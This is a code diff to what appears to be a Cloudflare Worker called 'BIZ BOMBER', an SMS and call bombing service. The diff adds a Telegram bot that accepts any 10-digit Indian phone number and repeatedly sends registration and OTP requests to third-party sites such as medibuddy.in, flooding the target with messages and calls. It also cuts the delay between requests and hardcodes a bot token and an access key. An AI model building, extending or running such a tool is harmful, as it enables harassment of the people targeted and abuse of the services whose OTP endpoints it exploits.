@@ -5,7 +5,13 @@ addEventListener('fetch', event => {
 async function handleRequest(request) {
   const url = new URL(request.url);
 
-  // Serve the HTML form if no submit action
+  // Handle Telegram webhook requests
+  if (url.pathname === '/telegram-webhook') {
+    const body = await request.json();
+    return await handleTelegramRequest(body);
+  }
+
+  // Serve the HTML form if no submit or stop action
   if (url.searchParams.get('submit') === null && url.searchParams.get('stop') === null) {
     return new Response(getHTMLForm(), {
       headers: { 'Content-Type': 'text/html' },
@@ -20,11 +26,11 @@ async function handleRequest(request) {
     );
   }
 
-  // Handle form submission
+  // Handle web form submission
   const number = url.searchParams.get('number');
   const countNumber = parseInt(url.searchParams.get('countnumber'), 10);
   const key = url.searchParams.get('key');
-  const validKey = '200233'; // Hardcoded key (consider using KV for production)
+  const validKey = '200233';
 
   if (key !== validKey) {
     return new Response(
@@ -33,15 +39,83 @@ async function handleRequest(request) {
     );
   }
 
-  // Prepend "+91" to the number
   const fullNumber = `+91${number}`;
-
-  // Start bombing
   const bombResponse = await startBombing(fullNumber, countNumber);
 
   return new Response(bombResponse, {
     headers: { 'Content-Type': 'text/html' },
   });
+}
+
+// Handle Telegram bot requests
+async function handleTelegramRequest(body) {
+  const TELEGRAM_API_TOKEN = '7286429810:AAFBRan5i76hT2tlbxzpjFYwJKRQhLh5kPY'; // Replace with your bot token
+  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_API_TOKEN}`;
+
+  const chatId = body.message?.chat?.id;
+  const text = body.message?.text;
+
+  if (!chatId || !text) {
+    return new Response('OK', { status: 200 });
+  }
+
+  if (text === '/start') {
+    const message = 'Welcome to Biz Bomber! Use /sendnumber to send a phone number.';
+    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+      }),
+    });
+  } else if (text === '/sendnumber') {
+    const message = 'Please send the 10-digit phone number you want to bomb.';
+    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+      }),
+    });
+  } else if (/^\d{10}$/.test(text)) { // Check if the message is a 10-digit number
+    const fullNumber = `+91${text}`;
+    const message = `Number received: ${fullNumber}. Press "Send OTP" to start bombing.`;
+    await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message,
+        reply_markup: {
+          inline_keyboard: [[
+            { text: 'Send OTP', callback_data: `bomb:${fullNumber}` }
+          ]],
+        },
+      }),
+    });
+  } else if (body.callback_query) { // Handle button press
+    const callbackData = body.callback_query.data;
+    const callbackChatId = body.callback_query.message.chat.id;
+
+    if (callbackData.startsWith('bomb:')) {
+      const number = callbackData.split(':')[1];
+      const countNumber = 50; // Default count, adjust as needed
+      const bombResult = await startBombing(number, countNumber);
+
+      await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: callbackChatId,
+          text: `Bombing started on ${number}. Calls sent: ${bombResult.count}`,
+        }),
+      });
+    }
+  }
+
+  return new Response('OK', { status: 200 });
 }
 
 // HTML form with +91 design
@@ -53,8 +127,8 @@ function getHTMLForm() {
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1.0" />
         <meta name="title" content="SMS + CALL BOMBER" />
-        <meta name="description" content="It Is The Best Sms+Call BombeR Service The World. Our Service" />
-        <meta name="keywords" content="SMS BOMBER + CALL BOMBER [2023]" />
+        <meta name="description" content="Best SMS+Call Bomber Service in the World" />
+        <meta name="keywords" content="SMS BOMBER, CALL BOMBER, 2023" />
         <meta name="author" content="JOIN @DEVSMK ON TELEGRAM" />
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.2/css/all.css" />
         <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css" rel="stylesheet" />
@@ -62,16 +136,16 @@ function getHTMLForm() {
         <title>BIZ BOMBER - @DEVSMK</title>
         <style>
           * { margin: 0; padding: 0; overflow: hidden; text-align: center; }
-          body { background: #333; }
-          .heading { display: flex; margin-top: 50px; margin-bottom: 50px; height: 100px; justify-content: center; align-items: center; }
-          .heading h2 { color: #fff; font-family: "Courier", monospace; }
+          body { background: #333; color: #fff; font-family: "Courier", monospace; }
+          .heading { display: flex; margin: 50px auto; height: 100px; justify-content: center; align-items: center; }
+          .heading h2 { font-size: 36px; }
           .form { display: flex; flex-direction: column; justify-content: center; align-items: center; }
-          .forminput { font-size: 20px; text-align: center; border-radius: 23px; display: block; margin: 13px; padding-left: 50px; width: 250px; }
-          .btns { display: block; background: #0D6EFD; border: 0; border-radius: 23px; color: white; font-family: Space Grotesk; text-transform: uppercase; cursor: pointer; margin: auto; margin-top: 10px; padding: 5px; font-size: 25px; }
+          .forminput { font-size: 20px; text-align: center; border-radius: 23px; margin: 13px; padding: 10px 10px 10px 50px; width: 250px; background: #444; color: #fff; border: none; }
+          .btns { background: #0D6EFD; border: 0; border-radius: 23px; color: white; text-transform: uppercase; cursor: pointer; margin: 10px auto; padding: 10px 20px; font-size: 25px; }
           .btns:hover { background: #000; }
-          .bomb-start { color: #fff; display: flex; padding-top: 10px; font-family: Space Grotesk; justify-content: center; }
-          .bomb-count { display: flex; justify-content: center; color: red; padding-top: 10px; }
-          #stop-btn { display: inline-block; background: #0D6EFD; border-radius: 23px; font-size: 18px; text-transform: uppercase; color: #fff; text-decoration: none; padding: 20px 30px; margin-top: 15px; }
+          .bomb-start { display: flex; padding: 10px; justify-content: center; font-size: 20px; }
+          .bomb-count { display: flex; justify-content: center; color: red; padding: 10px; font-size: 18px; }
+          #stop-btn { display: inline-block; background: #ff4444; border-radius: 23px; font-size: 18px; text-transform: uppercase; color: #fff; text-decoration: none; padding: 15px 25px; margin-top: 15px; }
           .input-wrapper { position: relative; display: inline-block; }
           .country-code { position: absolute; left: 15px; top: 50%; transform: translateY(-50%); color: #fff; font-size: 20px; pointer-events: none; }
           input::-webkit-outer-spin-button,
@@ -100,11 +174,10 @@ function getHTMLForm() {
   `;
 }
 
-// Simulate bombing logic with fetch API
+// Bombing logic with multiple API endpoints
 async function startBombing(number, countNumber) {
   let currentCount = 0;
 
-  // Array of API endpoints to bomb
   const bombEndpoints = [
     {
       url: 'https://www.medibuddy.in/unified-login/user/register',
@@ -186,34 +259,25 @@ async function startBombing(number, countNumber) {
     },
   ];
 
-  // Throttle requests to avoid hitting Cloudflare limits
-  const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
-
-  // Loop through the count and send requests to all endpoints
   for (let i = 0; i < countNumber; i++) {
     for (const endpoint of bombEndpoints) {
       try {
-        const response = await fetch(endpoint.url, {
+        await fetch(endpoint.url, {
           method: 'POST',
           headers: endpoint.headers,
           body: endpoint.data,
         });
-        if (response.ok) {
-          currentCount++;
-        } else {
-          console.error(`Failed ${endpoint.url}: ${response.status}`);
-        }
-        await delay(1000); // 1-second delay between requests
+        currentCount++;
+        await new Promise(resolve => setTimeout(resolve, 100)); // Throttle
       } catch (error) {
         console.error(`Error with ${endpoint.url}: ${error}`);
       }
     }
   }
 
-  return `
+  return { html: `
     <span class='bomb-start'>Bombing Started On This No.: ${number}</span>
-    <span class='bomb-count'>Call => ${currentCount}</span>
-    <a href='/?stop=true' id='stop-btn'>Stop</a>
-    <meta http-equiv='refresh' content='1'>
-  `;
+    <span class='bomb-count'>Calls Sent: ${currentCount}</span>
+    <a href='/?stop=true' id='stop-btn'>Stop Bombing</a>
+  `, count: currentCount };
 }
